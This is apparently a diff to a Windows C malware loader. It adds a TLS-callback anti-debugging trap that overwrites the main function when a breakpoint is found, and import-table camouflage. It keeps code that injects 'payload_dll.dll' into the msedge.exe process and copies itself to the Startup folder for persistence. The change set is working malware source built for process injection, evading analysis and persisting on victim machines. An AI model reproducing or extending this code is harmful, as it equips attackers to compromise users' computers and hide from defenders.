@@ -4,14 +4,53 @@
 #include <tlhelp32.h>
 #include <shlobj.h>
 #include <strsafe.h>
-#include "anti_debug.h"
-#include "drm.h"
 
-//Dummy Payload
-// Change as per the requirements
-VOID DPayload() {
-	MessageBox(NULL, L"Dummy", L"Dummy", MB_OK);
+#pragma comment (linker, "/INCLUDE:_tls_used")
+#pragma comment (linker, "/INCLUDE:CheckIfImgOpenedInADebugger")
+
+//----------------------------------------------------------------------------------------------------------------
+
+#define OVERWRITE_SIZE				0x500
+#define INT3_INSTRUCTION_OPCODE		0xCC
+
+//----------------------------------------------------------------------------------------------------------------
+#define ERROR_BUF_SIZE				(MAX_PATH * 2)
+//----------------------------------------------------------------------------------------------------------------
+#define PRINT( STR, ... )                                                                           \
+    if (1) {                                                                                        \
+        LPSTR cBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
+        if (cBuffer){                                                                               \
+            int iLength = wsprintfA(cBuffer, STR, __VA_ARGS__);                                     \
+            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), cBuffer, iLength, NULL, NULL);           \
+            HeapFree(GetProcessHeap(), 0x00, cBuffer);                                              \
+        }                                                                                           \
+    }  
+
+//----------------------------------------------------------------------------------------------------------------
+
+extern void* __cdecl memset(void*, int, size_t);
+
+#pragma intrinsic(memset)
+#pragma function(memset)
+void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
+	unsigned char* p = (unsigned char*)pTarget;
+	while (cbTarget-- > 0) {
+		*p++ = (unsigned char)value;
+	}
+	return pTarget;
 }
+
+//----------------------------------------------------------------------------------------------------------------
+// TLS Callback Function Prototypes:
+
+VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);
+
+#pragma const_seg(".CRT$XLB")
+EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CALLBACK)ADTlsCallback;
+#pragma const_seg()
+//----------------------------------------------------------------------------------------------------------------
+//----------------------------------------------------------------------------------------------------------------
+ 
 
 // Function to move the current running binary to the startup folder
 BOOL MoveToStartup() {
@@ -196,65 +235,86 @@ _EndOfFunction:
 
 int main() {
 
-	//Anti-Debugging Techniques (to modify)
-	if (AntiDbgNtSystemDebugControl() == FALSE) {
+	// Camoflage the IAT
+	IATCamoflage2();
 
-		// Hardcoded process name
-		wchar_t szProcessName[] = L"msedge.exe";
+	// Hardcoded process name
+	wchar_t szProcessName[] = L"msedge.exe";
 
-		// Get the current location of the binary
-		wchar_t szCurrentPath[MAX_PATH];
-		DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
-		if (length == 0) {
-			printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
-			return -1;
-		}
+	// Get the current location of the binary
+	wchar_t szCurrentPath[MAX_PATH];
+	DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
+	if (length == 0) {
+		printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
+		return -1;
+	}
 
-		// Remove the executable name from the path
-		wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
-		if (lastSlash != NULL) {
-			*lastSlash = L'\0';
-		}
+	// Remove the executable name from the path
+	wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
+	if (lastSlash != NULL) {
+		*lastSlash = L'\0';
+	}
 
-		// Append the DLL name to the path
-		wchar_t szDllPath[MAX_PATH];
-		swprintf(szDllPath, MAX_PATH, L"%s\\payload_dll.dll", szCurrentPath);
+	// Append the DLL name to the path
+	wchar_t szDllPath[MAX_PATH];
+	swprintf(szDllPath, MAX_PATH, L"%s\\payload_dll.dll", szCurrentPath);
 
-		DWORD dwProcessID;
-		HANDLE hProcess;
+	DWORD dwProcessID;
+	HANDLE hProcess;
 
-		// Get the handle of the target remote process
-		if (!GetRemoteProcessHandle(szProcessName, &dwProcessID, &hProcess)) {
-			printf("[!] Failed to get handle of the target process\n");
-			return -1;
-		}
+	// Get the handle of the target remote process
+	if (!GetRemoteProcessHandle(szProcessName, &dwProcessID, &hProcess)) {
+		printf("[!] Failed to get handle of the target process\n");
+		return -1;
+	}
 
-		printf("[*] Got handle of the target process with PID: %d\n", dwProcessID);
+	printf("[*] Got handle of the target process with PID: %d\n", dwProcessID);
 
-		// Inject the DLL into the remote process
-		if (!InjectDllToRemoteProcess(hProcess, szDllPath)) {
-			printf("[!] Failed to inject DLL into the target process\n");
-			CloseHandle(hProcess);
-			return -1;
-		}
-
-		// Camoflage the IAT
-		IATCamoflage2();
-
-		// Move the binary to the startup folder
-		if (!MoveToStartup()) {
-			printf("[!] Failed to move the binary to the startup folder\n");
-			return -1;
-		}
-
-		printf("[+] DLL injected successfully\n");
-
-		// Close the handle to the process
+	// Inject the DLL into the remote process
+	if (!InjectDllToRemoteProcess(hProcess, szDllPath)) {
+		printf("[!] Failed to inject DLL into the target process\n");
 		CloseHandle(hProcess);
+		return -1;
 	}
-	else {
-		DPayload();
+
+	// Move the binary to the startup folder
+	if (!MoveToStartup()) {
+		printf("[!] Failed to move the binary to the startup folder\n");
+		return -1;
 	}
+
+	printf("[+] DLL injected successfully\n");
+
+	// Close the handle to the process
+	CloseHandle(hProcess);
 
 	return 0;
+}
+
+// Anti-debugging TLS Callback Function
+VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext) {
+
+	DWORD		dwOldProtection = 0x00;
+
+	// Get the address of the main function
+	if (dwReason == DLL_PROCESS_ATTACH) {
+		PRINT("[TLS][i] Main Function Address: 0x%p \n", main);
+
+		// Check if the entry point is patched with INT 3 instruction
+		if (*(BYTE*)main == INT3_INSTRUCTION_OPCODE) {
+			PRINT("[TLS][!] Entry Point Is Patched With \"INT 3\" Instruction!\n");
+
+			// Overwrite main function - process crash
+			if (VirtualProtect(&main, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+				memset(main, 0xFF, OVERWRITE_SIZE);
+				PRINT("[TLS][+] Main Function Is Overwritten With 0xFF Bytes \n");
+			}
+
+			// Restore the original protection
+			else {
+				PRINT("[TLS][!] Failed To Overwrite The Entry Point\n");
+			}
+
+		}
+	}
 }
